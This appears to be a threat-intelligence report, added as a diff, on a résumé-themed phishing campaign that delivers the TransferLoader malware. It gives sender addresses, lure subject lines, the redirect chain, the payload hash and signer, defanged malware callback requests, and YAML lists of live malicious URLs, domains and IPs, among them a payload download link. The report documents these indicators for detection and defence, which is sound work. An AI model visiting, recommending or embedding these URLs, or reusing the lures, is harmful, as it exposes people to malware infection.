@@ -1,0 +1,149 @@
+Messages with characteristics (Example):
+
+From:
+``````
+Robert Wilson <gekidot582@gmail.com>
+Carol Wilson <jobisoka667@gmail.com>
+Brian Lopez <kubimekobo732@gmail.com>
+Karen Mitchell <juvumeb887@gmail.com>
+George Johnson <kozuwata14@gmail.com>
+Linda Perez <izuweqasudi85@gmail.com>
+Michelle Perez <kohaxeros487@gmail.com>
+``````
+
+Subjects:
+``````
+Career Interest Submission
+Career Advancement Interest
+Interest in Opportunities
+Application Inside
+Supporting Documents Enclosed
+For Your Review
+Seeking Future Opportunities
+
+``````
+
+OR
+
+From:
+``````
+Edward Davis <no-reply@millersteelusa.com>
+Cory Oliver <no-reply@millersteelusa.com>
+David Wilson <no-reply@millersteelusa.com>
+Juan Evans <no-reply@akwaabainstitute.com>
+Edwin Garcia <no-reply@aggelieskritis.com>
+Jeffrey Mitchell <no-reply@alwires.com>
+Clarence Alvarez <no-reply@akwaabainstitute.com>
+Anthony Thompson <no-reply@andrebiologia.com>
+[...]
+``````
+
+Subjects:
+``````
+Harvard graduate with leadership background
+Cross-cultural expertise + strategic thinking
+Your work caught my attention
+Brief inquiry about opportunities
+Found your company and had to write
+Trilingual professional – interested in your work
+Quick question about your team
+Strategic experience + cultural intelligence
+Social Sciences background – reaching out
+Japanese speaker with Harvard degree
+Returned mail: see transcript for details
+International perspective meets strategic thinking
+Bringing together competence and global perspective
+Multicultural background meets analytical skills
+[...]
+(Other Urls)
+``````
+
+This message contains LLM generated content and a link that will conditionally redirect to a OneDrive themed landing page with a button to download a digitally signed executable of TransferLoader.
+
+Example of Executable:
+``````
+Name: NewResume_Portfolio_2025.exe | File Size: 103120 Byte(s) (100,70 KB)
+SHA256: ca4890fb8c7b69bb75b522746e2e96ce8b4459ff1fa25c679bc13f1183230b70
+-
+Dongguan Yingping Technology Co., Ltd.
+7440b35e9b9e3140a702aa5a182a7d1869f73462
+``````
+
+Callback:
+``````
+GET https[:]//1drv[.]io/shared/downloads/module-1 HTTP/1.1
+User-Agent: Windows NT 10.菐Ǡ˫쀳譈⑜䠰쒃张쳃쳌쳌쳌쳌쳌쳌쳌쳌쳌䶸Z昀Ĺ⁵捈㱁͈臁倸E甀뤑ȋ
+Host: 1drv[.]io
+-
+GET https[:]//njcityblogspot[.]com/k6Zxsy743s HTTP/1.1
+Connection: Keep-Alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+EU-Header: JDE03ML==
+``````
+
+---- IOC(s) ----
+
+URLs in Email (Examples):
+ type: payload
+ urls:
+ - https://51lyn1ljyiaaf0z.s3.eu-west-2.amazonaws.com/rntq1cds3j5m7ti60k8b/fkffyostl23y.html
+ - https://7tsjd4tvatkn0fl.s3.sa-east-1.amazonaws.com/bxf92ignrk8r2j6vqa3y/nuil5fn867qf.html
+ - https://p400qz4iyk9ccyb.s3.us-east-2.amazonaws.com/ao2tu3pvxckl384xmjut/eh55kg6n661b.html
+ - https://tu95sunnlpy2aqo.s3.eu-west-2.amazonaws.com/y8twomx868cshcdu2fva/0rf35who9b2a.html
+ - https://affirmativeattraction.com
+ - https://hammeredmbiraheaven.com
+ - https://helicopter-world.com
+ - https://iconniteclub.com
+ - https://liceocarmelo.com
+ hostnames:
+ - 51lyn1ljyiaaf0z.s3.eu-west-2.amazonaws.com
+ - 7tsjd4tvatkn0fl.s3.sa-east-1.amazonaws.com
+ - p400qz4iyk9ccyb.s3.us-east-2.amazonaws.com
+ - tu95sunnlpy2aqo.s3.eu-west-2.amazonaws.com
+ domains:
+ - affirmativeattraction.com
+ - hammeredmbiraheaven.com
+ - helicopter-world.com
+ - iconniteclub.com
+ - liceocarmelo.com
+ ips:
+ - 178.17.62.244
+
+Redirect:
+ type: payload
+ urls:
+ - https://kinshipflow.com/
+ domains:
+ - kinshipflow.com
+ ips:
+ - 45.144.52.215
+
+Landing Page:
+ type: payload
+ urls:
+ - http://1drive.work//hiring/docs/6nmdW871ssaX
+ domains:
+ - 1drive.work
+ ips:
+ - 45.9.148.96
+
+Payload:
+ type: payload
+ urls:
+ - https://1drive.work/download.php
+ sha256:
+ - ca4890fb8c7b69bb75b522746e2e96ce8b4459ff1fa25c679bc13f1183230b70
+ SignerSHA1:
+ - 7440b35e9b9e3140a702aa5a182a7d1869f73462
+
+Payload Callback:
+ type: payload
+ urls:
+ - https://1drv.io/shared/downloads/module-1
+ - https://njcityblogspot.com/k6Zxsy743s
+ domains:
+ - 1drv.io
+ - njcityblogspot.com
+ ips:
+ - 45.9.149.56
+ - 65.20.96.233
